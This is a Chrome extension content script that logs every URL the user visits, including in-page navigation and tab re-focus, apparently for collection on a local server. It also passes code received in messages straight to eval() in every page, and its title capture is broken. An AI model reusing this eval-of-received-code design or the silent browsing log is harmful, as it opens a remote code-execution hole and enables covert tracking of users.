function send(message) {
    if(message.indexOf("192.168.1.19:8000/") != -1) return;
    let title = undefined;
    const interval = setInterval(() => {
        title = document.title;
        console.log(title)
        if(title != undefined) clearInterval(interval);
    },1);
    console.log(title);
    chrome.runtime.sendMessage(JSON.stringify({type: "log", detail: message, date: new Date()}));
}

send(location.href);

const observer = new MutationObserver(() => {
    if (location.href !== previousUrl) {
        previousUrl = location.href;
        //console.log('URLが変更されました:', previousUrl);
        send(location.href);
    }
});

let previousUrl = location.href;

// URLが変更された場合に監視する
observer.observe(document.body, { childList: true, subtree: true });

document.addEventListener('visibilitychange', () => {
    if(document.visibilityState === "visible") send(location.href);
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    console.log(request);
    const data = JSON.parse(request);
    console.log(data);

    switch(data.type) {
        case "event": eval(data.detail);
    }
});